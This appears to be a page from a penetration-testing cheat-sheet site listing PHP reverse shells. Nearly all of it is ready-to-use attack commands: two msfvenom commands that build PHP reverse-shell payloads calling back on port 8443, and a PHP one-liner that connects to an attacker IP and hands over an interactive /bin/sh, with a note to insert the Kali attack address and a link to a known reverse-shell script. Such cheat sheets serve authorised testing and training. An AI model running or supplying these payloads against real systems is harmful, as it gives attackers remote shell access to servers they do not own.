---
title: PHP Reverse Shells
layout: default
nav_order: 4
parent: Reverse Shells

---

# PHP Reverse Shell
{: .no_toc }
## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}

### Meterpreter
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=8443 -f raw > shell.php
```

### Non-Meterpreter
```bash
msfvenom -p php/reverse_php LHOST=tun0 LPORT=8443 -f raw > shell.php
```

```php
php -r '$sock=fsockopen("10.0.0.1",8443);exec("/bin/sh -i <&3 >&3 2>&3");'
```
NOTE: Change the `10.0.0.1` parameter to actual Kali attack IP

Reference - https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
